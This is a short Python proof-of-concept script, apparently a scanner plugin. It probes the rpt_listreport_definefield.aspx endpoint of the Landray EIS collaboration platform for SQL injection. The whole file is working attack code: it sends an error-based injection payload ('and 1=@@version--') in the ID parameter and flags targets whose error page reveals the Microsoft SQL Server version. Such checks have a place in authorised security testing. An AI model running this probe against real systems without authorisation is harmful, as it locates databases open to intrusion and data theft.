import requests
import urllib

def verify(url):
    relsult = {
        'name': '蓝凌EIS智慧协同平台rpt_listreport_definefield.aspx接口存在SQL注入漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Upgrade-Insecure-Requests': '1'
    }
    vurl = urllib.parse.urljoin(url, "/SM/rpt_listreport_definefield.aspx?ID=2%20and%201=@@version--+")
    try:
        response = requests.get(vurl, headers=headers)
        if response.status_code == 500 and 'Microsoft' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult